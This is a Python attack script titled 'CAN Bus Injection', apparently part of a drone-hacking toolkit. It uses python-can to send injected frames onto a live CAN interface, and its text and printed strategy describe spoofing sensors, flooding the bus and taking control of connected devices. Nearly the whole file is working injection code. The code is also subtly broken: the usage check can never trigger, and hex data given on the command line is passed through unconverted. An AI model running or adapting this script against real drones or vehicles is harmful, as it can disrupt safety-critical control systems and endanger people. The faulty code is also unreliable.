#!/usr/bin/env python3
"""
CAN Bus Injection
Inject malicious messages into CAN bus network

Exploits CAN bus communication to inject malicious messages,
disrupt communication, or take control of CAN-connected devices.

CVSS Score: 6.5 (Medium)
Affected: Drones with CAN bus interfaces
"""

import sys
import time

def check_can_tools():
    """Check if CAN tools are available"""
    try:
        import can
        return True
    except ImportError:
        return False

def inject_can_messages(interface='can0', message_id=0x123, data=None):
    """
    Inject malicious CAN messages
    
    Args:
        interface: CAN interface (e.g., can0, vcan0)
        message_id: CAN message ID
        data: Message data (bytes or list)
    """
    try:
        print("[*] CAN Bus Injection Attack")
        print(f"[*] Interface: {interface}")
        print(f"[*] Message ID: 0x{message_id:x}")
        print()
        
        has_can = check_can_tools()
        
        if not has_can:
            print("[!] python-can not available - using simulation mode")
            print("[*] Install with: pip install python-can")
            print("[*] May require: sudo apt-get install can-utils")
            print()
        
        print("[*] CAN Injection Strategy:")
        print("    1. Connect to CAN bus interface")
        print("    2. Identify target message IDs")
        print("    3. Inject malicious CAN messages")
        print("    4. Disrupt communication or take control")
        print()
        
        if has_can:
            import can
            
            try:
                # Create CAN bus interface
                print(f"[*] Opening CAN interface {interface}...")
                bus = can.interface.Bus(channel=interface, bustype='socketcan')
                print("[+] CAN bus connected")
                
                # Prepare message data
                if data is None:
                    data = [0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08]
                elif isinstance(data, str):
                    data = [int(x, 16) for x in data.split()]
                elif isinstance(data, list):
                    pass
                else:
                    data = list(data)
                
                # Inject messages
                print("[*] Injecting CAN messages...")
                for i in range(10):
                    msg = can.Message(
                        arbitration_id=message_id + i,
                        data=data,
                        is_extended_id=False
                    )
                    bus.send(msg)
                    print(f"[+] Sent message ID: 0x{msg.arbitration_id:x}")
                    time.sleep(0.1)
                
                # Inject extended ID messages
                print("[*] Injecting extended ID messages...")
                for i in range(5):
                    msg = can.Message(
                        arbitration_id=0x1FFFFFFF - i,
                        data=data,
                        is_extended_id=True
                    )
                    bus.send(msg)
                    print(f"[+] Sent extended ID: 0x{msg.arbitration_id:x}")
                    time.sleep(0.1)
                
                bus.shutdown()
                print("[+] CAN injection completed")
            except Exception as e:
                print(f"[-] CAN injection failed: {e}")
                print("[*] Using simulation mode...")
                simulate_can_injection()
        else:
            simulate_can_injection()
        
        return True
        
    except Exception as e:
        print(f"[-] Attack failed: {e}")
        return False

def simulate_can_injection():
    """Simulate CAN injection"""
    print("[*] Simulation mode: CAN bus injection")
    print("[*] Would attempt:")
    print("    - Inject control messages")
    print("    - Inject sensor spoofing messages")
    print("    - Flood CAN bus with messages")
    print("    - Exploit CAN ID collision")
    print("    - Exploit CAN error handling")

def main():
    if len(sys.argv) < 1:
        print("Usage: python3 can_bus_injection.py [interface] [message_id] [data]")
        print("\nArguments:")
        print("  interface    CAN interface (default: can0)")
        print("  message_id   CAN message ID in hex (default: 0x123)")
        print("  data         Message data as hex bytes (default: 01 02 03 04 05 06 07 08)")
        print("\nExamples:")
        print("  python3 can_bus_injection.py")
        print("  python3 can_bus_injection.py can0 0x456")
        print("  python3 can_bus_injection.py vcan0 0x789 AA BB CC DD")
        print("\nCAN Bus Injection")
        print("CVSS Score: 6.5 (Medium)")
        print("Affected: Drones with CAN bus interfaces")
        print("\nNote: Requires python-can library")
        print("      Install: pip install python-can")
        print("      May require: sudo apt-get install can-utils")
        print("      May require root/sudo for CAN access")
        sys.exit(1)
    
    interface = sys.argv[1] if len(sys.argv) > 1 else 'can0'
    message_id = int(sys.argv[2], 16) if len(sys.argv) > 2 else 0x123
    data = sys.argv[3:] if len(sys.argv) > 3 else None
    
    inject_can_messages(interface, message_id, data)

if __name__ == "__main__":
    main()
